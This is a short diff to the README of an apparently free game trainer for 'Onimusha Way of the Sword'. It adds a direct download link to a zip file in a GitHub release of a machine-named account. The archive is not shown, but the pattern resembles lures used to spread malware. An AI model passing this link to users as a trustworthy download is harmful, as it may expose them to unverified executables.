@@ -13,7 +13,7 @@ Free, open source, no installer. Opens with `Insert`.
 ![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)
 ![Boards](https://img.shields.io/badge/leaderboards-blocked%20by%20default-c25640?style=flat-square)
 
-**[⬇ Download the latest release]()** · [Hotkeys](#hotkeys) · [FAQ](#faq)
+**[⬇ Download the latest release](https://github.com/043-Onyx-Void3343/Onimusha-Way-of-the-Sword---Trainer/releases/download/Onimusha/Onimusha-Way-of-the-Sword---Trainer.zip)** · [Hotkeys](#hotkeys) · [FAQ](#faq)
 
 ---
 
